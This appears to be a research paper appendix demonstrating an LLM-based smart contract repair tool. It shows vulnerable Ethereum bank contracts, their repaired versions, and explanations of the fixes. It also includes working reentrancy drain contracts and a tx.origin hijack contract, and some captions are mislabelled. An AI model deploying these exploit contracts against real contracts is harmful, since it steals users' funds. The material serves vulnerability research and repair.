# The Examples of Incident Contracts

To demonstrate the effectiveness of AutoMender, we apply it to real-world contracts deployed on Ethereum in Dataset\_2 and public bug incident contracts from Dataset\_3. 

## Wild Ethereum Contract Instances

The *ERC20* contract after repair.
```
	contract ERC20 {
		event Transfer( address indexed from, address indexed to, uint256 value );
		event Approval( address indexed owner, address indexed spender, uint256 value);
		using SafeMath for *;	
		mapping (address => uint256) private _balances;
		mapping (address => mapping (address => uint256)) private _allowed;
		uint256 private _totalSupply;
		constructor(uint totalSupply){
			_balances[msg.sender] = totalSupply;
		}
		function approve(address spender, uint256 value) internal returns (bool) {
			require(spender != address(0));
			_allowed[msg.sender][spender] = value;
			emit Approval(msg.sender, spender, value);
			return true;
		}
		function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
			approve(spender, _allowed[msg.sender][spender].add(addedValue));
			return true;
		}
		function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
			approve(spender, _allowed[msg.sender][spender].sub(subtractedValue));
			return true;
		}
		function transferFrom(address from, address to, uint256 value) public returns (bool) {
			require(value <= _balances[from]);
			require(value <= _allowed[from][msg.sender]);
			require(to != address(0));
			_balances[from] = _balances[from].sub(value);
			_balances[to] = _balances[to].add(value);
			_allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
			emit Transfer(from, to, value);
			return true;
		}
		...
	}
```

The *TokenBank* contract.
```
	contract TokenBank is Token {
		address public owner;
		uint public MinDeposit;
		mapping (address => uint) public Holders;
		//Constructor
		function initTokenBank() public {
			owner = msg.sender;
			MinDeposit = 1 ether;
		}
		function Deposit() public payable {
			if(msg.value>=MinDeposit){
				Holders[msg.sender]+=msg.value;
			}
		}
		function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable {
			if(Holders[msg.sender]>0){
				if(Holders[_addr]>=_wei){
					_addr.call.value(_wei);
					Holders[_addr]-=_wei;
				}
			}
		}
		...
	}
```

**TokenBank bug Contract (18 transactions, 1.0E+18 Wei).** This contract is a "bank" contract code used for managing assets, with the main part shown in above figure. According to the logic presented in the contract, the contract owner can set a minimum deposit amount ''MinDeposit=1 ether'' when creating the contract. Subsequently, users can call the function ''Deposit()'' to deposit funds into the contract’s account. When users need to withdraw funds, they contact the contract owner (similar to going to the "bank" and speaking with a teller) to perform the withdrawal operation.

The contract for the *reentrancy-eth* bug attack on the *PrivateDeposit* contract.
```
	contract TokenBankExploit {
		address owner; //Attack settings
		TokenBank tokenBank;
		function ReentranceExploit() payable{
			owner = msg.sender;
		}
		function exploitcall(TokenBank tokenBanktmp) payable{
			tokenBank = tokenBanktmp;
			tokenBank.call{value: msg.value}(abi.encodeWithSignature("Deposit()"));
			tokenBank.initTokenBank();
			tokenBank.WithdrawToHolder(address(this), msg.value);
		}
		function get_money(){
			suicide(owner); //Destroy contract and get assets.
		}
		function() payable{
			tokenBank.WithdrawToHolder(address(this), msg.value);
		}
	}
```

However, this contract also contains multiple bugs. Specifically:

(i) In the function ''WithdrawToHolder(address, uint)'', there is an *arbitrary-send* bug. Anyone can call the function ''initTokenBank()'' to become the contract owner and then call ''WithdrawToHolder(address, uint)'' to withdraw funds to any address they choose. This could happen without the user’s consent, as the user incurs additional gas costs each time they deposit funds. This operation causes the user's prior gas expenses to be wasted.

(ii) In line 12, there is an *integer-overflow* bug. As the balance of the depositing account continues to accumulate, the addition operation ''Holders[msg.sender] += msg.value'' may overflow, causing the account balance to suddenly decrease to ''Holders[msg.sender] + msg.value - $ 2^{256} $''.

(iii) In line 18, the *call.value* operation contains *unchecked-lowlevel*, *code-no-effects*, and *reentrancy-eth* issues. First, the *call.value* does not check the return value of the call. When the call fails, the account \_addr does not receive the transferred funds, but its balance in the *TokenBank* contract is reduced. Second, since the transfer operation *call.value* lacks the data field, although the contract compiler does not report a compilation error, the operation has no effect when called, causing the user to execute a withdrawal operation while the contract balance is deducted without actually receiving the transfer, leading to economic loss. Finally, because the operation ''Holders[\_addr] -= \_wei'' is performed after the *call.value*, a malicious attacker could exploit a reentrancy attack. Specifically, the attacker can construct a helper attack contract *TokenBankExploit* that contains a callback fallback function calling the function ''WithdrawToHolder()'' as shown in above code. When the attacker executes the function ''exploitcall()'' to sequentially complete the deposit, owner initialization, and withdrawal operations for the *TokenBank* contract, the execution of ''WithdrawToHolder()'' triggers the callback function of the*{TokenBankExploit*contract, causing ''WithdrawToHolder()'' to be called repeatedly. Since the account balance has not yet been updated (i.e., the statement ''Holders[\_addr] -= \_wei'' has not been executed), the attacker can repeatedly receive the transferred amount until the gas resources are exhausted or the *TokenBank* contract balance is insufficient. Finally, the attacker can call the helper contract's function ''get\_money()'' to obtain the entire balance of the helper contract and then destroy it. Through this process, the attacker acquires funds that originally did not belong to them, damaging the economic interests of other legitimate users.

(iv) The functions ''Deposit()'' and ''WithdrawToHolder()'' have *external-function* optimization issues. Since these two functions are not called internally within the contract and are only used externally, their visibility can be declared as *external* to save gas costs during function execution. In response to the contract bugs described above, AutoMender, with its context-awareness and understanding of the contract's operational logic, along with sufficient knowledge of contract bugs, has correctly and thoroughly fixed the issues. The fixed contract is shown in Listing \ref{listing:chap6_TokenBank-fixed}.

The *TokenBank* contract after repaire.
```
	contract TokenBank is Token {
		address public owner;
		uint public MinDeposit;
		mapping (address => uint) public Holders;
		//Constructor
		constructor() public payable {
			owner = msg.sender;
			MinDeposit = 1 ether;
		}
		function Deposit() external payable {
			if(msg.value>=MinDeposit){
				Holders[msg.sender]+=msg.value;
				require(Holders[msg.sender]>=msg.value);
			}
		}
		function WithdrawToHolder(address _addr, uint _wei) external onlyOwner payable {
			if(Holders[msg.sender]>0){
				if(Holders[_addr]>=_wei){
					Holders[_addr]-=_wei;
					if(!_addr.call.value(_wei)("")){
						Holders[_addr]+=_wei;
					}
				}
			}
		}
		...
	}
```

As shown above, AutoMender made the following modifications for each bug:
(i) AutoMender detected that the original function ''initTokenBank()'' should be a constructor, responsible for initializing the owner and MinDeposit for the contract creator. Therefore, in the fixed contract, the function ''initTokenBank()'' was changed to a constructor. This ensures that the function ''WithdrawToHolder()'' can only be executed by the contract owner, fulfilling the original design intent and fixing the *arbitrary-send* bug.

(ii) AutoMender used the *require* statement to verify that the integer addition operation satisfies the correct size relationship, thus preventing the *integer-overflow* bug.

(iii) To address the *code-no-effects* and *unchecked-lowlevel* bugs, AutoMender completed the data field for the *call.value* operation and validated its return value. Meanwhile, to fix the *reentrancy-eth* bug, it placed the state-modifying operation ''Holders[\_addr] -= \_wei'' before the *call* transfer operation, and reverted the state change if the operation failed. It is evident that AutoMender did not directly replace the *call.value* with the *transfer* function, as seen in previous contract examples. Instead, under the constraints of the bug coefficients, it kept the *call.value* operation as much as possible to retain the original contract structure, showing that it can adjust in real-time when fixing bug codes based on the specific situation. Additionally, for multiple bugs, the repair solutions were integrated to minimize redundant code.

(iv) AutoMender reduced the gas costs when calling the functions ''Deposit()'' and ''WithdrawToHolder()'' by declaring their visibility as *external*.

As can be seen, the bugs also require the repair tool to understand the operational logic of the contract, not just matching specific bug code. Since the code for these different bugs needs to be integrated into a single repair solution, many methods cannot fully fix the contract bugs. This is the fundamental reason for AutoMender introducing the repair layer.

The *Wallet* contract.
```
	pragma solidity ^0.5.0; 
	contract Wallet {
		mapping(address => uint) balance;
		// Deposit funds in contract
		function deposit(uint amount) public payable {
			require(msg.value == amount, 'msg.value must be equal to amount');
			balance[msg.sender] = amount;
		}
		// Withdraw funds from contract
		function withdraw(uint amount) public {
			require(amount <= balance[msg.sender], 'amount must be less than balance');
			uint previousBalance = balance[msg.sender];
			balance[msg.sender] = previousBalance - amount; 
			// Attempt to send amount from the contract to msg.sender
			msg.sender.call.value(amount);
		}
		...
	}
```

**Wallet bug Contract (12 transactions, 2.7E+16 Wei).** This contract has similar functionality to the *TokenBank* contract. The difference is that in this contract, anyone can withdraw the amount in the contract's account without contacting the contract owner. That is, the user can call the function ''deposit(uint)'' to deposit a specified amount into the contract's account, and then, when the user needs to withdraw funds, they can call the function ''withdraw(uint)'' to complete the withdrawal and transfer operation.

However, this contract also contains multiple issues, specifically:
(i) The functions ''deposit()'' and ''withdraw()'' have *external-function* optimization issues. Since neither of these functions is called internally within the contract, they can be declared as *external* to reduce gas costs when they are invoked.

(ii) In line 15, the *call.value* operation contains both*unchecked-lowlevel* and *code-no-effects* issues. First, there is no check on the return value of *call.value*, and secondly, the function is missing the data field. As described in the contract repair case above, these two issues can lead to unexpected results.

The above code presents the contract code after AutoMender’s fix, which resolves all of the aforementioned issues.

Firstly, (i) AutoMender modified the visibility of the functions ''deposit()'' and ''withdraw()'' to *external* to solve the *external-function* issue.

(ii) AutoMender first added an empty data field to the *call.value* function to resolve the *code-no-effects* issue. Then, it used ''(bool success, )'' to capture the return value of *call.value*, followed by a *require* statement for verification. If the call fails, the *require* statement rolls back the transaction, thereby fixing the *unchecked-lowlevel* bug. 

It is worth noting that, due to the contract's compilation version being 0.5.0 or higher, the previous approach to direct *require* verification would not compile, i.e., ''require(msg.sender.call.value(amount)(""))''. This is because versions above 0.5.0 cannot ignore the two return values, so the *require* statement cannot directly validate it. AutoMender’s accurate repair of this bug can be attributed to both the prior knowledge of contract bugs and programming standards, as well as the strict control over the repair quality through the contract bug repair output module, based on the bug repair evaluation coefficient (contract runtime evaluation coefficient).

Therefore, during contract repair, different contract compilation versions can impact the repair solution for the same bug code. Since templates cannot account for all such scenarios, some existing predefined template-based repair methods, such as Elysium and RLRep, fail to properly fix these bugs.

The contract *Wallet* after repaire.
```
	pragma solidity ^0.5.0; 
	contract Wallet {
		mapping(address => uint) balance;
		// Deposit funds in contract
		function deposit(uint amount) external payable {
			require(msg.value == amount, 'msg.value must be equal to amount');
			balance[msg.sender] = amount;
		}
		// Withdraw funds from contract
		function withdraw(uint amount) external {
			require(amount <= balance[msg.sender], 'amount must be less than balance');
			uint previousBalance = balance[msg.sender];
			balance[msg.sender] = previousBalance - amount; 
			// Attempt to send amount from the contract to msg.sender
			(bool success, ) = msg.sender.call.value(amount)("");
			require(success);
		}
		...
	}
```

**PrivateDeposit bug Contract (5 transactions, 0.0E+00 Wei).** This contract can also be seen as a private "bank" for managing assets, with the details shown in above code. Unlike the previous two "bank" contracts, this contract uses a *Log* contract to record each call's events, making it easier to trace errors when they occur. Specifically, when creating the contract, the contract creator declares their account as the contract's owner ''owner'' and creates a *Log* contract object. The *Log* contract, as shown in below code, is used by the *PrivateDeposit* contract to call the function ''AddMessage(address,uint,string)'' to encapsulate event content into a *Message* structure object called ''LastMsg'', and then adds it to the event sequence ''History''. As shown in Listing \ref{listing:chap6_PrivateDeposit}, before using the event recorder normally, the contract owner needs to call the function ''setLog(address)'' to instantiate the state recorder object ''TransferLog'' using the *Log* contract's address. Then, users can normally call the function ''Deposit()'' to store funds in the contract’s account, and when they need to withdraw, they can call the function ''CashOut(uint)''.

However, this contract also contains several bugs, specifically:
(i) The function modifier ''onlyOwner()'' contains a *tx-origin* bug. Since it uses *tx.origin* to verify the identity of the contract caller, i.e., ''require(tx.origin == owner)'', an attacker can bypass this check and perform illegal operations using a helper contract as shown in Listing \ref{listing:chap6_PrivateDeposit-tx-origin}. Specifically, the attacker constructs a *Log* contract with the same name as the log library, containing two functions: one is ''getMoney()'' to call the *PrivateDeposit* contract's function ''setLog(address)'', and the other is a function ''AddMessage(address, uint, string)'' that has the same name and parameters as the one used for logging operations. Since the contract code can be deployed on the blockchain without being made public, with only the contract bytecode and the ABI (interface of the functions) stored on the blockchain, the attractive name of the ''getMoney()'' function can lure the *PrivateDeposit* contract creator into calling it. This will initiate a cross-contract call to the ''setLog()'' function, and since the transaction's source *tx.origin* is the contract creator, it can pass the *onlyOwner()* check and instantiate the helper attack contract *Log* as the log recorder. The function ''AddMessage()'' contains only a line that executes the failing statement ''require(false)'', which triggers the rollback mechanism, causing all calls to this function to fail, thereby rendering the *PrivateDeposit* contract's functions ''Deposit()'' and ''CashOut()'' inoperable.

*PrivateDeposit* contract.
```
	contract PrivateDeposit {
		mapping (address => uint) public balances;
		uint public MinDeposit = 1 ether;
		address public owner;
		Log TransferLog;
		modifier onlyOwner() {
			require(tx.origin == owner); _;
		}    
		function PrivateDeposit(){
			owner = msg.sender;
			TransferLog = new Log();
		}
		function setLog(address _lib) onlyOwner {
			TransferLog = Log(_lib);
		}
		function Deposit() public payable {
			if(msg.value >= MinDeposit){
				balances[msg.sender]+=msg.value;
				TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
			}
		}
		function CashOut(uint _am){
			if(_am<=balances[msg.sender]){            
				if(msg.sender.call.value(_am)()){
					balances[msg.sender]-=_am;
					TransferLog.AddMessage(msg.sender,_am,"CashOut");
				}
			}
		}
		function() public payable{}    
	}
```

(ii) In line 24, the *call.value* operation contains both *reentrancy-eth* and *reentrancy-events* bugs. The state variable update operation ''balances[msg.sender] -= \_am'' and the event logging operation ''TransferLog.AddMessage(msg.sender, msg.value, "Deposit")'' both occur after the *call.value*, allowing a malicious attacker to perform a reentrancy attack. Specifically, the attacker can construct a helper attack contract *PrivateDepositExploit*, which contains a callback fallback function that calls the function ''CashOut()'', as shown in Listing \ref{listing:chap6_PrivateDeposit-reentrancy-eth-attack}. When the attacker executes the function ''exploitcall()'' to sequentially perform the deposit and withdrawal operations on the *PrivateDeposit* contract, the execution of *CashOut()* triggers the callback function of the *PrivateDepositExploit* contract. This causes *CashOut()* to be called repeatedly. Since the account balance has not yet been updated and the transfer operation event has not been logged, the attacker can repeatedly claim the transferred amount until the gas resources are exhausted or the *PrivateDeposit* contract balance is insufficient. As in the previous reentrancy example, the attacker can eventually call the helper contract’s function ''get\_money()'' to obtain the entire balance of the helper contract and then destroy the contract.

*Log* contract.
```
	contract Log {
		struct Message {
			address Sender;
			string  Data;
			uint Val;
			uint  Time;
		}
		Message[] public History;
		Message LastMsg;
		function AddMessage(address _adr,uint _val,string _data) public {
			LastMsg.Sender = _adr;
			LastMsg.Time = now;
			LastMsg.Val = _val;
			LastMsg.Data = _data;
			History.push(LastMsg);
		}
	}
```

The helper contract for the *tx-origin* bug attack on the *PrivateDeposit* contract.
```
	contract Log {
		address privateDeposit_address = "0x..."; //Replace the real address of the *PrivateDeposit} contract
		function getMoney() public {
			PrivateDeposit privateDeposit = PrivateDeposit(privateDeposit_address);
			privateDeposit.setLog(address(this));
		}
		function AddMessage(address _adr,uint _val,string _data) public {
			require(false);
		}
	}
```

The helper contract for the *reentrancy-eth* bug attack on the *PrivateDeposit* contract.
```
	contract PrivateDepositExploit {
		address owner; //Attack settings
		PrivateDeposit privateDeposit;
		uint callvalue;
		function ReentranceExploit() payable{
			owner = msg.sender;
		}
		function exploitcall(PrivateDeposit privateDeposittmp) payable{
			privateDeposit = privateDeposittmp;
			callvalue = msg.value;
			privateDeposittmp.call{value: callvalue}(abi.encodeWithSignature("Deposit()"));
			privateDeposittmp.CashOut(callvalue);
		}
		function get_money(){
			suicide(owner); //Destroy contract and get assets.
		}
		function() payable{
			privateDeposit.CashOut(callvalue);
		}
	}
```

(iii) In line 18, the integer addition operation contains an*integer-overflow* bug. When users continually add funds to the contract's account, causing ''balances[msg.sender] + msg.value $ \geq 2^{256} $'', an integer overflow occurs, which means the user’s actual deposit is drastically reduced to ''balances[msg.sender] + msg.value - $ 2^{256} $''.

(iv) In line 3, there is a *constable-states* optimization issue. Since the variable ''MinDeposit'' does not change its value, it can be declared as a constant to reduce gas costs when it is used.

(v) The functions ''setLog()'', ''Deposit()'', and ''CashOut()'' (in versions prior to 0.5.0, the default function visibility is public) have an *external-function* optimization issue. Since these functions are only called externally in the *PrivateDeposit* contract, their visibility can be declared as *external* to reduce gas costs when called.

As in the previous contract repair examples, AutoMender, with its superior understanding of contract semantics and bug repair capabilities, addressed these issues. The fixed contract is shown in Listing \ref{listing:chap6_PrivateDeposit-fixed}.

The code of the *PrivateDeposit* contract after repaire.
```
	contract PrivateDeposit {
		mapping (address => uint) public balances;
		uint constant public MinDeposit = 1 ether;
		address public owner;
		Log TransferLog;
		modifier onlyOwner() {
			require(msg.sender == owner); _;
		}    
		function PrivateDeposit(){
			owner = msg.sender;
			TransferLog = new Log();
		}
		function setLog(address _lib) external onlyOwner {
			TransferLog = Log(_lib);
		}
		function Deposit() external payable {
			if(msg.value >= MinDeposit){
				balances[msg.sender]+=msg.value;
				require(balances[msg.sender] >= msg.value);
				TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
			}
		}
		function CashOut(uint _am) external {
			if(_am<=balances[msg.sender]){
				balances[msg.sender]-=_am;
				TransferLog.AddMessage(msg.sender,_am,"CashOut");
				require(msg.sender.call.value(_am)());
			}
		}
		function() public payable{}
	}
```

As described above, AutoMender made the following changes:

(i) To directly verify that the contract caller is the contract owner, the verification statement ''require(tx.origin == owner)'' was changed to ''require(msg.sender == owner)'' to fix the *tx-origin* bug.

(ii) To address the *reentrancy-eth* and *reentrancy-events* bugs, AutoMender adopted the check-effects-interactions pattern, moving the state update and event logging operations before the transfer operation. Additionally, considering the restoration of event records, AutoMender changed the original ''if'' statement to a ''require'' statement. When the transfer operation fails, the *require* will throw an exception and roll back all transactions, including the event log. Here, the *require* statement was used instead of directly replacing it with a *transfer* operation, which reflects AutoMender's ability to make minimal changes to the bug code and the diversity of the repair solutions.

(iii) AutoMender used the *require* statement to verify the result of the integer addition operation to avoid the *integer-overflow* bug.

(iv) AutoMender marked the state variable ''MinDeposit'' as *constant* to resolve the *constable-states* optimization issue.

(v) AutoMender changed the visibility of the functions ''setLog()'', ''Deposit()'', and ''CashOut()'' to *external* to reduce gas costs when called.

However, due to the limited types of bugs that the repair templates can fix, existing methods like SmartFix and SCRepair cannot fully address the bugs mentioned above. Additionally, due to the limited semantic understanding of smaller models, SmartRep is unable to comprehensively repair these bugs. This also highlights the inherent advantages of large language models: on one hand, they can perceive the contract’s operational logic, enabling them to rewrite contracts; on the other hand, they can deeply understand the principles of bugs, enabling the repair of bug code. 